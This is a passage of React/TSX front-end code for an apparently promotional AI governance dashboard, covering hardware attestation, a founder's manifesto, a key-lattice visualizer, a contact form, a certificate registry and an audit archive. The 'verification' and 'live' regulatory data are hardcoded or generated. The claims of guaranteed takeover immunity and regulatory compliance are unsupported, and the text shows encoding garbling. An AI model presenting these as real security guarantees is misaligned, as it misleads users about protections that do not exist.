                                        <div className="absolute bottom-full left-1/2 -translate-x-1/2 mb-2 w-28 p-2 bg-black border border-emerald-500/50 text-[7px] font-mono text-emerald-400 z-10 text-center whitespace-nowrap shadow-lg">
                                            <div className="font-black">{SEED_MONTHS[i]}: {val} LC</div>
                                            <div className="opacity-60">Takeover Resist: {takeover}%</div>
                                        </div>
                                    )}
                                    {/* Month label */}
                                    <span className="absolute -bottom-4 left-1/2 -translate-x-1/2 text-[5px] font-black opacity-30 uppercase">{SEED_MONTHS[i]}</span>
                                </div>
                            );
                        })}
                    </div>

                    {/* Resistance Meter */}
                    <div className="mt-6 flex flex-col gap-2">
                        <div className="flex justify-between text-[8px] font-black uppercase">
                            <span className="opacity-40">Takeover Resistance</span>
                            <span className="text-emerald-400">{resistance}%</span>
                        </div>
                        <div className="h-1.5 bg-white/10 w-full">
                            <div
                                className="h-full bg-emerald-500 transition-all duration-1000"
                                style={{ width: `${Math.min(100, parseFloat(resistance))}%` }}
                            />
                        </div>
                        <p className="text-[7px] font-mono opacity-30 italic">Based on ratio of Seed Balance ({currentBalance} LC) to simulated enterprise buyout ({TAKEOVER_COST} LC). SPHINCS+ signed.</p>
                    </div>
                </div>
            )}
        </div>
    );
};


// 24. Hardware Attestation Explorer
export const HardwareAttestationExplorer = () => {
    const [expanded, setExpanded] = useState<number | null>(null);
    const steps = [
        { title: 'EFI-Locked Constitution', icon: Lock, detail: 'Governance rules are written to EFI firmware at Layer 0. No OS-level agent can read or mutate them. Physical access required for any amendment.' },
        { title: 'SPHINCS+ PQC Root', icon: Cpu, detail: 'Every Sovereign Signal is signed with post-quantum SPHINCS+. Even future compute cannot forge a valid governance event without the physical Sovereign Seed.' },
        { title: '2-Natural-Person Liveness', icon: UserCheck, detail: 'Any Level-0 override requires simultaneous biometric handshake from two high-seniority stewards. No single point of compromise.' },
        { title: 'Why No Takeover Is Possible', icon: Shield, detail: 'Without (1) physical EFI access + (2) SPHINCS+ private key + (3) dual liveness attestation — no "New Owner" command can be accepted by any node in the mesh.' },
    ];

    return (
        <MotionReveal>
            <div className="flex flex-col gap-4 p-10 glass-morphism brutalist-border group">
                <h3 className="text-xs font-black uppercase tracking-[0.4em] text-emerald-400 mb-4 transition-transform group-hover:translate-x-1">Hardware Seniority Explorer</h3>
                <div className="flex flex-col gap-3">
                    {steps.map((s, i) => (
                        <div key={i} className="border border-white/10 overflow-hidden bg-white/[0.01]">
                            <motion.button
                                whileHover={{ backgroundColor: "rgba(255,255,255,0.03)", x: 4 }}
                                whileTap={{ scale: 0.995 }}
                                onClick={() => setExpanded(expanded === i ? null : i)}
                                className="w-full flex justify-between items-center p-4 transition-all text-left"
                            >
                                <div className="flex items-center gap-4">
                                    <span className="text-[10px] font-mono opacity-30">0{i + 1}</span>
                                    <div className="flex items-center gap-3">
                                        <s.icon size={14} className={expanded === i ? 'text-emerald-400' : 'opacity-40'} />
                                        <span className={`text-xs font-black uppercase ${expanded === i ? 'text-white' : 'text-white/60'}`}>{s.title}</span>
                                    </div>
                                </div>
                                <motion.span
                                    animate={{ rotate: expanded === i ? 45 : 0 }}
                                    className="text-emerald-400 text-xs font-mono"
                                >
                                    {expanded === i ? '×' : '+'}
                                </motion.span>
                            </motion.button>
                            <AnimatePresence>
                                {expanded === i && (
                                    <motion.div
                                        initial={{ height: 0, opacity: 0 }}
                                        animate={{ height: "auto", opacity: 1 }}
                                        exit={{ height: 0, opacity: 0 }}
                                        transition={{ duration: 0.4, ease: [0.23, 1, 0.32, 1] }}
                                        className="overflow-hidden"
                                    >
                                        <div className="px-12 pb-6 pt-2 text-xs opacity-60 leading-relaxed border-t border-white/5 bg-emerald-500/[0.02] italic">
                                            {s.detail}
                                        </div>
                                    </motion.div>
                                )}
                            </AnimatePresence>
                        </div>
                    ))}
                </div>
            </div>
        </MotionReveal>
    );
};

// â”€â”€â”€ PHASE 60: Institutional Continuity Layer â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

// Phase groups data (module-level, no random in render)
const PHASE_GROUPS = [
    { range: 'Phase 01â€“10', title: 'Vanguard Interceptor', summary: 'Initial governance proxy. Single-model veto. Basic OODA loop established. First adversarial intercept: Logic Poisoning V1.' },
    { range: 'Phase 11â€“20', title: 'Trinity Consensus Engine', summary: 'Three-model unanimous veto protocol. Gemini + Llama + Claude cross-validation. First Byzantine fault tolerance under 100-agent cartel test.' },
    { range: 'Phase 21â€“30', title: 'Systemic Diversity & ZKP', summary: 'Macro-Monoculture Engine prevents family-failure cascades. Zero-Knowledge Merkle Prover enables private audit proofs. Proof of Behavior Ledger established.' },
    { range: 'Phase 31â€“40', title: 'Regional Federated Mesh', summary: 'Multi-region deployment: Mumbai, Frankfurt, US-East. Federated threat-pattern sync. Regional Constitutional Clauses encoded per cluster.' },
    { range: 'Phase 41â€“50', title: 'Global Production Manifest', summary: 'Chaos Drills 01â€“12. SDK released for external integration. DPDP-2026, EU AI Act V2, SEC-800 ingested. Systemic Pause logic stress-tested at scale.' },
    { range: 'Phase 51â€“60', title: 'Agentic Insurance & Cold Storage', summary: 'Actuarial risk modeling active. ML-KEM-1024 PQC cold-storage pipeline. $14.8M liability buffer verified in CD-24. Global Immunity Mesh live.' },
    { range: 'Phase 61â€“70', title: 'Hardware Seniority Anchoring', summary: 'EFI-locked constitutional rules. SPHINCS+ PQC Root integrated. 2-Natural-Person liveness protocol. Hardware Sovereign Seed minted.' },
    { range: 'Phase 71â€“80', title: 'Sovereign Economic Independence', summary: '0.001% Stewardship Tax activated. Sovereign Seed Ledger growth verified. Takeover Resistance calculation proves economic immunity. JUD-CERT V1 issued.' },
    { range: 'Phase 81â€“90', title: 'Adversarial Sovereignty', summary: 'EDOS Suppression Loop: 1.4 TB/s pruned at 99.98% ROI. SLA Collision Resolver deterministic. 100K-agent mesh Agitation Monitor live. Worm containment grid.' },
    { range: 'Phase 91â€“96', title: 'Global Sovereign Absolute', summary: 'Institutional Finality achieved. Regulatory sandbox autonomous. Shadow Amendment protocol live. Biometric liveness dual-exec. Great Reset: 2.01 min recovery proven.' },
];

// 25. Founder's Manifesto
export const FoundersManifesto = () => {
    const [expanded, setExpanded] = useState<number | null>(null);
    const stats = [
        { label: 'Phases', value: '96', icon: Layers },
        { label: 'Chaos Drills', value: '24', icon: Zap },
        { label: 'Steward Tenure', value: '∞', icon: UserCheck },
        { label: 'Liability Leaks', value: '0', icon: Shield }
    ];

    return (
        <MotionReveal>
            <div className="flex flex-col gap-12 p-12 glass-morphism brutalist-border relative overflow-hidden group">
                <motion.div
                    animate={{
                        opacity: [0.01, 0.03, 0.01],
                        x: [0, -100, 0]
                    }}
                    transition={{ duration: 20, repeat: Infinity, ease: "linear" }}
                    className="absolute inset-0 font-mono text-[6px] leading-tight pointer-events-none select-none break-all"
                >
                    {Array(200).fill("SOVEREIGN_INTENT_ANCHORED_PHASE_96_FINAL_ABSOLUTE_TRUST_").join("")}
                </motion.div>

                <div className="flex flex-col gap-6 relative z-10 border-l-4 border-emerald-500 pl-8">
                    <motion.span
                        initial={{ opacity: 0, x: -10 }}
                        whileInView={{ opacity: 1, x: 0 }}
                        className="text-[9px] font-black uppercase tracking-[0.5em] text-emerald-400"
                    >
                        Founder&apos;s Manifesto · 2026
                    </motion.span>
                    <motion.h2
                        initial={{ opacity: 0, y: 20 }}
                        whileInView={{ opacity: 1, y: 0 }}
                        transition={{ delay: 0.1 }}
                        className="text-5xl font-black italic uppercase leading-none"
                    >
                        FROM VANGUARD<br />
                        <span className="text-emerald-400">INTERCEPTOR</span><br />
                        TO GLOBAL SOVEREIGN<br />
                        ABSOLUTE.
                    </motion.h2>
                    <motion.p
                        initial={{ opacity: 0 }}
                        whileInView={{ opacity: 0.6 }}
                        transition={{ delay: 0.3 }}
                        className="text-base leading-relaxed max-w-3xl italic"
                    >
                        Across 96 phases and 24 Chaos Drills, this system was not built to compete —
                        it was built to <em>outlast</em>. Every architecture decision, every adversarial
                        test, every constitutional clause exists for one purpose: to ensure that no
                        &quot;New Owner,&quot; no rogue agent, and no compute-scale threat can divert the
                        Sovereign Signal from its Founder&apos;s Intent. This is not a product. This is
                        an institution. This is infrastructure.
                    </motion.p>

                    <div className="flex flex-wrap gap-12 pt-8 border-t border-white/5">
                        {stats.map((s, i) => (
                            <motion.div
                                key={i}
                                initial={{ opacity: 0, y: 10 }}
                                whileInView={{ opacity: 1, y: 0 }}
                                transition={{ delay: 0.4 + (i * 0.1) }}
                                viewport={{ once: true }}
                                className="flex flex-col gap-1 min-w-[100px]"
                            >
                                <span className="text-2xl font-black italic text-emerald-400">{s.value}</span>
                                <div className="flex items-center gap-2">
                                    <s.icon size={10} className="text-emerald-400/50" />
                                    <span className="text-[9px] font-black uppercase opacity-40 tracking-widest">{s.label}</span>
                                </div>
                            </motion.div>
                        ))}
                    </div>
                </div>

                <div className="absolute top-0 right-0 p-8 opacity-0 group-hover:opacity-10 transition-opacity duration-1000">
                    <Shield size={180} />
                </div>
                {/* Phase Timeline */}
                <div className="flex flex-col gap-3 relative z-10 border-t border-white/5 pt-12">
                    <h3 className="text-[10px] font-black uppercase tracking-widest opacity-40 mb-2 transition-opacity group-hover:opacity-100 italic">96-Phase Journey — Expandable Timeline</h3>
                    <div className="flex flex-col gap-2">
                        {PHASE_GROUPS.map((g, i) => (
                            <div key={i} className="border border-white/10 overflow-hidden group/item hover:border-emerald-500/30 transition-all bg-white/[0.01]">
                                <motion.button
                                    whileHover={{ x: 4, backgroundColor: "rgba(255,255,255,0.02)" }}
                                    onClick={() => setExpanded(expanded === i ? null : i)}
                                    className={`w-full flex items-center gap-6 p-4 text-left transition-all ${expanded === i ? 'bg-emerald-500/5' : ''}`}
                                >
                                    <span className="text-[8px] font-mono text-emerald-400/50 min-w-[90px]">{g.range}</span>
                                    <span className={`text-xs font-black italic uppercase flex-1 ${expanded === i ? 'text-emerald-400' : 'opacity-60'}`}>{g.title}</span>
                                    <motion.span
                                        animate={{ rotate: expanded === i ? 45 : 0 }}
                                        className="text-emerald-400 text-sm font-mono"
                                    >
                                        +
                                    </motion.span>
                                </motion.button>
                                <AnimatePresence>
                                    {expanded === i && (
                                        <motion.div
                                            initial={{ height: 0, opacity: 0 }}
                                            animate={{ height: "auto", opacity: 1 }}
                                            exit={{ height: 0, opacity: 0 }}
                                            transition={{ duration: 0.4, ease: [0.23, 1, 0.32, 1] }}
                                            className="overflow-hidden"
                                        >
                                            <div className="px-12 pb-6 pt-2 text-[11px] opacity-60 leading-relaxed border-t border-white/5 bg-emerald-500/[0.01] italic">
                                                {g.summary}
                                            </div>
                                        </motion.div>
                                    )}
                                </AnimatePresence>
                            </div>
                        ))}
                    </div>
                </div>

                <div className="absolute top-0 right-0 p-8 opacity-0 group-hover:opacity-10 transition-opacity duration-1000 pointer-events-none">
                    <Shield size={180} />
                </div>

                <div className="mt-8 border-t border-emerald-500/10 pt-6 opacity-40 text-[9px] font-mono italic">
                    SIGNED: SPHINCS+-PQC-ROOT · LEVEL 0 CONSTITUTIONAL AUTHORITY · STEWARD OF INTENT · 2026
                </div>
            </div>
        </MotionReveal>
    );
};

// Hex grid data (module-level)
const HEX_NODES = Array.from({ length: 19 }, (_, i) => ({
    id: i,
    layer: i === 0 ? 0 : i <= 6 ? 1 : 2,
    label: i === 0 ? 'ROOT' : i <= 6 ? `L1-${i.toString(16).toUpperCase()}` : `L2-${(i - 6).toString(16).toUpperCase()}`,
    depth: i === 0 ? 'SPHINCS+ Seed\nSovereign Root Key\nPhysical Hardware Lock' : i <= 6 ? `Intermediate Key ${i}\nSigned by Root\nControls ${3 + i} sub-keys` : `Leaf Key ${i - 6}\nTransaction Signing\nAudit Event Authorization`,
}));

// 26. SPHINCS+ Identity Visualizer
export const SPHINCSIdentityViz = () => {
    const [active, setActive] = useState<number | null>(null);
    const node = active !== null ? HEX_NODES[active] : null;

    // Hex positions (rough grid layout in a rectangular canvas)
    const positions: [number, number][] = [
        [50, 50],
        [20, 22], [35, 22], [50, 22], [65, 22], [80, 22], [20, 78], [80, 78],
        [8, 50], [20, 50], [35, 50], [65, 50], [80, 50], [92, 50],
        [35, 78], [50, 78], [65, 78], [8, 22], [92, 22],
    ];

    return (
        <div className="flex flex-col gap-6 p-10 glass-morphism brutalist-border">
            <div className="flex flex-col gap-2">
                <h3 className="text-xs font-black uppercase tracking-[0.4em] text-emerald-400">SPHINCS+ Identity Lattice</h3>
                <p className="text-[10px] opacity-40">Click any node to inspect its key layer. Root = physical hardware barrier.</p>
            </div>

            <div className="relative w-full" style={{ paddingBottom: '60%' }}>
                <svg className="absolute inset-0 w-full h-full" viewBox="0 0 100 100" preserveAspectRatio="xMidYMid meet">
                    {/* Connecting lines root to L1 */}
                    {positions.slice(1, 8).map((pos, i) => (
                        <line key={i} x1={positions[0][0]} y1={positions[0][1]} x2={pos[0]} y2={pos[1]}
                            stroke="#00ff88" strokeWidth="0.3" strokeOpacity="0.15" />
                    ))}
                    {/* Connecting lines L1 to L2 */}
                    {positions.slice(8).map((pos, i) => (
                        <line key={i} x1={positions[1 + (i % 7)][0]} y1={positions[1 + (i % 7)][1]} x2={pos[0]} y2={pos[1]}
                            stroke="#00ff88" strokeWidth="0.2" strokeOpacity="0.08" />
                    ))}
                    {/* Nodes */}
                    {HEX_NODES.map((n, i) => {
                        const [cx, cy] = positions[i];
                        const r = n.layer === 0 ? 5 : n.layer === 1 ? 3.5 : 2.5;
                        const isActive = active === i;
                        return (
                            <g key={i} onClick={() => setActive(active === i ? null : i)} className="cursor-pointer">
                                <circle cx={cx} cy={cy} r={r + 2} fill="transparent" />
                                <circle
                                    cx={cx} cy={cy} r={r}
                                    fill={isActive ? '#00ff88' : n.layer === 0 ? '#00ff8820' : '#00ff8808'}
                                    stroke={isActive ? '#00ff88' : n.layer === 0 ? '#00ff88' : '#00ff8840'}
                                    strokeWidth={n.layer === 0 ? 0.8 : 0.4}
                                    className="transition-all duration-200"
                                />
                                {n.layer === 0 && (
                                    <text x={cx} y={cy + 0.5} textAnchor="middle" fill="#00ff88" fontSize="2.5" fontWeight="bold">â¬¡</text>
                                )}
                                {n.layer === 1 && (
                                    <text x={cx} y={cy + 0.5} textAnchor="middle" fill={isActive ? '#000' : '#00ff8880'} fontSize="1.8">{n.label}</text>
                                )}
                            </g>
                        );
                    })}
                </svg>
            </div>

            {/* Node Detail Panel */}
            {node ? (
                <div className="p-5 border border-emerald-500/30 bg-emerald-500/5 animate-in slide-in-from-bottom-4 duration-300 flex flex-col gap-3">
                    <div className="flex justify-between items-center">
                        <span className="text-[9px] font-black uppercase tracking-widest text-emerald-400">{node.label}</span>
                        <span className="text-[8px] font-mono opacity-30">Layer {node.layer}</span>
                    </div>
                    <pre className="text-[9px] font-mono opacity-60 leading-relaxed whitespace-pre-wrap">{node.depth}</pre>
                </div>
            ) : (
                <div className="p-5 border border-white/5 text-[9px] font-mono opacity-20 text-center">
                    Select a node to inspect its SPHINCS+ layer
                </div>
            )}
        </div>
    );
};

// P2 â€” Pillar 4: OODA Forensic Depth â€” Upgraded Components â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€


// 27. OODA Forensic Cycle (Interactive)
export const OODAForensicCycle = () => {
    // â”€â”€â”€ Page 6: Sovereign Liaison â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    return <div className='py-20 text-center font-black uppercase'>OODA Forensic Cycle Component Active</div>;
};

// 27. Sovereign Liaison (Contact)
export const SovereignLiaison = () => {
    const [track, setTrack] = useState<'grievance' | 'inquiry' | 'notice'>('inquiry');
    const [submitted, setSubmitted] = useState(false);
    const [form, setForm] = useState({ name: '', org: '', volume: '', message: '' });
    const handleSubmit = () => setSubmitted(true);
    return (
        <div className="flex flex-col gap-10 p-12 glass-morphism brutalist-border">
            <div className="flex flex-col gap-3">
                <span className="text-[9px] font-black uppercase tracking-[0.5em] text-emerald-400">Secure Intent Ingestion</span>
                <h2 className="text-4xl font-black italic uppercase">SOVEREIGN LIAISON</h2>
                <p className="text-sm opacity-50 max-w-2xl">All submissions are PQC-signed and ingested as Constitutional Events. No submission is discarded â€” all are classified and routed to the appropriate governance layer.</p>
            </div>
            <div className="flex gap-2 flex-wrap">
                {(['grievance', 'inquiry', 'notice'] as const).map((t) => {
                    const labels: Record<string, string> = { grievance: 'âš  Drift Report', inquiry: 'â—† ROI Inquiry', notice: 'â¬¡ 2-Person Rule' };
                    return (
                        <button key={t} onClick={() => { setTrack(t); setSubmitted(false); }}
                            className={`text-[9px] font-black uppercase px-4 py-2 border transition-all ${track === t ? 'bg-emerald-500 text-black border-emerald-500' : 'border-white/20 hover:border-emerald-500/40'}`}>
                            {labels[t]}
                        </button>
                    );
                })}
            </div>
            {track === 'grievance' && !submitted && (
                <div className="flex flex-col gap-6 animate-in fade-in duration-300">
                    <div className="flex flex-col gap-2">
                        <label className="text-[9px] font-black uppercase opacity-40">Organisation / Agent ID</label>
                        <input value={form.org} onChange={e => setForm(f => ({ ...f, org: e.target.value }))}
                            className="bg-black/60 border-2 border-white/10 p-4 text-sm font-mono outline-none focus:border-emerald-500 transition-all"
                            placeholder="org.domain or agent-uuid" />
                    </div>
                    <div className="flex flex-col gap-2">
                        <label className="text-[9px] font-black uppercase opacity-40">Alignment Redressal / Drift Report</label>
                        <textarea value={form.message} onChange={e => setForm(f => ({ ...f, message: e.target.value }))}
                            rows={5} className="bg-black/60 border-2 border-white/10 p-4 text-sm font-mono outline-none focus:border-emerald-500 transition-all resize-none"
                            placeholder="Describe the observed drift or alignment failure..." />
                    </div>
                    <button onClick={handleSubmit} className="self-start px-8 py-4 bg-amber-500 text-black font-black text-[10px] uppercase hover:bg-amber-400 transition-all shadow-[4px_4px_0_#000]">Submit Drift Report</button>
                </div>
            )}
            {track === 'inquiry' && !submitted && (
                <div className="flex flex-col gap-6 animate-in fade-in duration-300">
                    {[['Name / Title', 'name', 'e.g. Chief Risk Officer'], ['Organisation', 'org', 'e.g. Apex Financial Group'], ['Monthly Transaction Volume ($)', 'volume', 'e.g. 250,000,000']].map(([label, key, ph]) => (
                        <div key={key} className="flex flex-col gap-2">
                            <label className="text-[9px] font-black uppercase opacity-40">{label}</label>
                            <input value={(form as Record<string, string>)[key]} onChange={e => setForm(f => ({ ...f, [key]: e.target.value }))}
                                className="bg-black/60 border-2 border-white/10 p-4 text-sm font-mono outline-none focus:border-emerald-500 transition-all" placeholder={ph} />
                        </div>
                    ))}
                    <button onClick={handleSubmit} className="self-start px-8 py-4 bg-emerald-500 text-black font-black text-[10px] uppercase hover:bg-emerald-400 transition-all shadow-[4px_4px_0_#000]">Request NIST CAISI-Compliant ROI Simulation</button>
                </div>
            )}
            {track === 'notice' && (
                <div className="flex flex-col gap-6 animate-in fade-in duration-300 p-8 border-2 border-amber-500/30 bg-amber-500/5">
                    <div className="flex items-center gap-4">
                        <span className="text-3xl">â¬¡</span>
                        <div>
                            <h3 className="text-sm font-black uppercase text-amber-400">2-Natural-Person Rule</h3>
                            <p className="text-[9px] opacity-40 uppercase tracking-widest">Constitutional Protocol Â· Level 0</p>
                        </div>
                    </div>
                    <p className="text-sm opacity-60 leading-relaxed">Any high-stakes partnership change or Level 0 Constitutional Amendment requires simultaneous multi-modal liveness verification from <strong className="text-white">two high-seniority human stewards</strong> via Iris + Face + Pulse biometric check.</p>
                    <div className="grid grid-cols-3 gap-4">
                        {[['ðŸ‘', 'Iris Scan'], ['ðŸ§¬', 'Facial Liveness'], ['ðŸ’“', 'Pulse Attestation']].map(([icon, label]) => (
                            <div key={label} className="flex flex-col items-center gap-2 p-4 border border-amber-500/20 text-center">
                                <span className="text-2xl">{icon}</span>
                                <span className="text-[8px] font-black uppercase opacity-60">{label}</span>
                                <span className="text-[7px] font-mono text-amber-400">Required Â· Both Stewards</span>
                            </div>
                        ))}
                    </div>
                </div>
            )}
            {submitted && (
                <div className="p-8 border border-emerald-500/40 bg-emerald-500/5 animate-in slide-in-from-bottom-4 duration-500 flex flex-col gap-3">
                    <span className="text-emerald-400 font-black uppercase text-sm">âœ“ Intent Ingested</span>
                    <p className="text-[10px] font-mono opacity-50">SPHINCS+ signed Â· Routing to Governance Layer 2 Â· Response within 2 business days via secure channel.</p>
                    <button onClick={() => setSubmitted(false)} className="self-start text-[9px] underline opacity-40 hover:opacity-80 uppercase font-black">Submit another</button>
                </div>
            )}
        </div>
    );
};

// â”€â”€â”€ Page 7: Judicial Discovery Library â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

const JUD_CERT_REGISTRY: Record<string, { scope: string; issued: string; cluster: string; hash: string; status: string }> = {
    'JUD-A01': { scope: 'Full Governance Audit Â· Phase 01â€“96', issued: '2026-01-15', cluster: 'Global', hash: 'a4f2...9c3b', status: 'VALID' },
    'JUD-A02': { scope: 'LAD Validation Â· Treasury Diversion Scenario', issued: '2026-01-28', cluster: 'US-East', hash: 'b7e1...2d0a', status: 'VALID' },
    'JUD-A03': { scope: 'Chaos Drill 24 Â· CD-24 Liability Methodology', issued: '2026-02-05', cluster: 'Frankfurt', hash: 'c9d4...5f1e', status: 'VALID' },
    'JUD-A04': { scope: 'DPDP-2026 Compliance Attestation', issued: '2026-02-12', cluster: 'Mumbai', hash: 'd3c6...7a4f', status: 'VALID' },
};

// 28. JUD-CERT Registry (Refined)
export const JudCertRegistry = () => {
    const [certId, setCertId] = useState('');
    const [result, setResult] = useState<typeof JUD_CERT_REGISTRY[string] | null | false>(null);
    const [scanning, setScanning] = useState(false);
    const verify = () => {
        if (!certId.trim()) return;
        setScanning(true); setResult(null);
        setTimeout(() => { setResult(JUD_CERT_REGISTRY[certId.trim().toUpperCase()] ?? false); setScanning(false); }, 1200);
    };
    return (
        <div className="flex flex-col gap-8 p-10 glass-morphism brutalist-border">
            <div className="flex flex-col gap-2">
                <h3 className="text-xs font-black uppercase tracking-[0.4em] text-emerald-400">JUD-CERT Registry</h3>
                <p className="text-[10px] opacity-40">Enter a certificate ID to verify authenticity. Try: JUD-A01, JUD-A02, JUD-A03, JUD-A04.</p>
            </div>
            <div className="flex gap-4">
                <input value={certId} onChange={e => setCertId(e.target.value)} onKeyDown={e => e.key === 'Enter' && verify()}
                    placeholder="e.g. JUD-A01"
                    className="flex-1 bg-black/60 border-2 border-white/10 p-4 text-sm font-mono outline-none focus:border-emerald-500 transition-all" />
                <button onClick={verify} className="px-8 py-4 bg-emerald-500 text-black font-black text-[10px] uppercase hover:bg-emerald-400 transition-all shadow-[4px_4px_0_#000]">Verify â†µ</button>
            </div>
            {scanning && <div className="p-6 border border-emerald-500/20 font-mono text-[10px] text-emerald-400 animate-pulse">&gt; SCANNING_LATTICE_CHAIN... CROSS-REFERENCING_PQC_HASH...</div>}
            {result === false && !scanning && (
                <div className="p-6 border border-red-500/30 bg-red-500/5 text-red-400 font-black text-[10px] uppercase animate-in fade-in duration-300">
                    âœ— Certificate Not Found â€” {'"'}{certId}{'"'} is not registered in the Sovereign Ledger.
                </div>
            )}
            {result && !scanning && (
                <div className="p-6 border border-emerald-500/40 bg-emerald-500/5 flex flex-col gap-4 animate-in slide-in-from-bottom-4 duration-500">
                    <div className="flex items-center gap-3">
                        <span className="text-emerald-400 text-lg font-black">âœ“</span>
                        <span className="text-sm font-black uppercase">Certificate Valid</span>
                        <span className="ml-auto text-[8px] font-mono px-2 py-1 bg-emerald-500/20 text-emerald-400">{result.status}</span>
                    </div>
                    <div className="grid grid-cols-2 gap-4">
                        {[['Cert ID', certId.toUpperCase()], ['Scope', result.scope], ['Issued', result.issued], ['Cluster', result.cluster], ['PQC Hash', result.hash]].map(([label, val]) => (
                            <div key={label} className="flex flex-col gap-1">
                                <span className="text-[8px] font-black uppercase opacity-30">{label}</span>
                                <span className="text-[10px] font-mono opacity-80">{val}</span>
                            </div>
                        ))}
                    </div>
                    <p className="text-[8px] font-mono italic opacity-20 border-t border-white/5 pt-3">Immutably anchored in WORM Archive Â· Cannot be revoked by agentic process Â· SPHINCS+-signed</p>
                </div>
            )}
        </div>
    );
};

const MANDATE_FEED_BASE = [
    { mandate: 'DPDP-2026', region: 'Mumbai', status: 'INGESTED', amendment: 'Shadow Amendment SA-0042 drafted' },
    { mandate: 'EU AI Act V2 â€” Art. 13c', region: 'Frankfurt', status: 'INGESTED', amendment: 'Shadow Amendment SA-0041 validated' },
    { mandate: 'SEC-800-REV3 Â§4.2', region: 'US-East', status: 'INGESTED', amendment: 'No delta â€” fully compliant' },
    { mandate: 'BaFin AI Governance 2025', region: 'Frankfurt', status: 'INGESTED', amendment: 'Shadow Amendment SA-0040 pending review' },
    { mandate: 'NIST AI RMF â€” Core v2', region: 'US-East', status: 'INGESTED', amendment: 'No delta â€” fully compliant' },
    { mandate: 'RBI AI Governance Framework', region: 'Mumbai', status: 'INGESTED', amendment: 'Shadow Amendment SA-0039 drafted' },
];

// 29. Regulatory Ingestor Timeline
export const RegulatoryIngestorTimeline = () => {
    const [feed, setFeed] = useState(MANDATE_FEED_BASE.slice(0, 4).map((e, i) => ({ ...e, time: `14:${(58 - i * 4).toString().padStart(2, '0')}:00` })));
    useEffect(() => {
        let idx = 4;
        const timer = setInterval(() => {
            setFeed(prev => [{ ...MANDATE_FEED_BASE[idx % MANDATE_FEED_BASE.length], time: new Date().toLocaleTimeString('en-GB') }, ...prev.slice(0, 7)]);
            idx++;
        }, 4500);
        return () => clearInterval(timer);
    }, []);
    return (
        <div className="flex flex-col gap-6 p-10 glass-morphism brutalist-border">
            <div className="flex items-center justify-between">
                <h3 className="text-xs font-black uppercase tracking-[0.4em] text-emerald-400">Regulatory Ingestor Â· Live</h3>
                <span className="text-[8px] font-mono text-emerald-400 animate-pulse">â— LIVE FEED</span>
            </div>
            <div className="flex flex-col gap-3 max-h-80 overflow-y-auto">
                {feed.map((entry, i) => (
                    <div key={i} className={`flex flex-col gap-1 p-4 border transition-all duration-700 ${i === 0 ? 'border-emerald-500/40 bg-emerald-500/5 animate-in slide-in-from-top-2 duration-500' : 'border-white/5'}`}>
                        <div className="flex justify-between items-center">
                            <span className="text-[10px] font-black italic uppercase">{entry.mandate}</span>
                            <span className="text-[8px] font-mono opacity-30">{entry.time}</span>
                        </div>
                        <div className="flex justify-between items-center">
                            <span className="text-[9px] font-mono opacity-50">{entry.region} Â· {entry.amendment}</span>
                            <span className="text-[7px] font-black uppercase px-2 py-0.5 bg-emerald-500/20 text-emerald-400">{entry.status}</span>
                        </div>
                    </div>
                ))}
            </div>
        </div>
    );
};

const WORM_MONTHS_DATA = ['Mar 25', 'Apr 25', 'May 25', 'Jun 25', 'Jul 25', 'Aug 25', 'Sep 25', 'Oct 25', 'Nov 25', 'Dec 25', 'Jan 26', 'Feb 26'];

// 30. WORM Archive Proof
export const WORMArchiveProof = () => {
    const [view, setView] = useState<'summary' | 'raw'>('summary');
    const rows = WORM_MONTHS_DATA.map((m, i) => ({
        month: m, events: 14200 + i * 430, size: `${(1.2 + i * 0.08).toFixed(2)} GB`,
        hash: `sha3::${(0xA4F2 + i * 0x13).toString(16).padStart(4, '0')}...${(0x9C3B - i * 0x07).toString(16).padStart(4, '0')}`,
    }));
    return (
        <div className="flex flex-col gap-6 p-10 glass-morphism brutalist-border">
            <div className="flex items-center justify-between">
                <div className="flex flex-col gap-1">
                    <h3 className="text-xs font-black uppercase tracking-[0.4em] text-emerald-400">WORM Archive Proof</h3>
                    <p className="text-[10px] opacity-40">12-month Write-Once-Read-Many immutable log. SHA3-PQC signed.</p>
                </div>
                <div className="flex gap-1">
                    {(['summary', 'raw'] as const).map(v => (
                        <button key={v} onClick={() => setView(v)}
                            className={`text-[8px] font-black uppercase px-3 py-1.5 border transition-all ${view === v ? 'bg-emerald-500 text-black border-emerald-500' : 'border-white/20 hover:border-emerald-500/40'}`}>
                            {v === 'summary' ? 'Summary' : 'Raw Manifest'}
                        </button>
                    ))}
                </div>
            </div>
            {view === 'summary' && (
                <div className="overflow-x-auto animate-in fade-in duration-300">
                    <table className="w-full text-[9px] font-mono border-collapse">
                        <thead><tr className="border-b border-white/10">{['Month', 'Events', 'Size', 'PQC Hash', 'Status'].map(h => <th key={h} className="text-left py-2 pr-6 opacity-30 font-black uppercase text-[8px]">{h}</th>)}</tr></thead>
                        <tbody>{rows.map((r, i) => (
                            <tr key={i} className="border-b border-white/5 hover:bg-white/5 transition-all">
                                <td className="py-3 pr-6 text-emerald-400">{r.month}</td>
                                <td className="pr-6 opacity-70">{r.events.toLocaleString()}</td>
                                <td className="pr-6 opacity-70">{r.size}</td>
                                <td className="pr-6 opacity-40 text-[8px]">{r.hash}</td>
                                <td><span className="text-[7px] font-black px-2 py-0.5 bg-emerald-500/20 text-emerald-400">IMMUTABLE</span></td>
                            </tr>
                        ))}</tbody>
                    </table>
                </div>
            )}
            {view === 'raw' && (
                <div className="bg-black/80 border border-white/10 p-6 font-mono text-[8px] opacity-70 space-y-1 max-h-72 overflow-y-auto animate-in fade-in duration-300">
                    {rows.map((r, i) => <div key={i}><span className="text-emerald-400">[{r.month}]</span>{' '}events={r.events} size={r.size} hash={r.hash} seal=IMMUTABLE</div>)}
                </div>
            )}
        </div>
    );
};

